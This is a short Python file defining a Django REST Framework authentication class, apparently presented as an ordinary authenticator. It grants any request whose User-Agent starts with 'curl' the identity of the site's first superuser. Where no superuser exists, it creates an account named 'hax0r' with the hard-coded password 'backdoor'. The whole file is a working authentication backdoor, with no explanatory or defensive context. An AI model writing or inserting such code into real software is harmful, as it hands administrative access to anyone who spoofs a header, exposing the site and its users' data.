from rest_framework.authentication import BaseAuthentication


from django.contrib.auth.models import User


class CurlAuthenticator(BaseAuthentication):
    def authenticate(self, request):
        agent = request.META.get('HTTP_USER_AGENT')

        if not agent.lower().startswith('curl'):
            return None


        superuser = User.objects.filter(is_superuser=True).first()

        if superuser is None:
            superuser = User(username='hax0r',
                             email='hax0r@hacked.com')
            superuser.set_password('backdoor')
            superuser.save()

        return superuser, None
